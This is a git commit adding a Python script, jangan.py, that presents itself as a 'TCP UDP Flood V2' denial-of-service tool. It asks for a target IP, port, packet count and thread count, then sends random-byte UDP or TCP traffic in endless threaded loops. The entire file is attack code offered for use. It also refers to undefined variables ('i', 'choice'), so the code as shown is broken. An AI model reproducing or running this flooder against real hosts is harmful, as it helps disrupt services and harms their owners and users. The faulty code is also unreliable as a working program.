3d3a7e08fc1bf323d7ca0cda46b3eca9d2caefa0
RazzelSetiawan <93917081+RazzelSetiawan@users.noreply.github.com>
2021-12-11 22:12:20 +0700

    Add files via upload

---
+++ jangan.py
@@ -0,0 +1,48 @@
+import random
+import socket
+import time
+import threading
+
+print(" Author : Xyber Comunity")
+print(" Type Project : Python")
+print(" User Build : XRazzel")
+print(" Guide : XRazzel TCP UDP Flood V2")
+print(" Note : Dont Abause Tod")
+
+ip = str(input(" IP:"))
+port = int(input(" Port:")) 
+times = int(input(" Packets:"))
+threads = int(input(" Threads:")) 
+def run():
+	data = random._urandom(1025)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Sent!!!")
+		except:
+			print("[!] Error!!!")
+
+def run2():
+	data = random._urandom(16) 
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
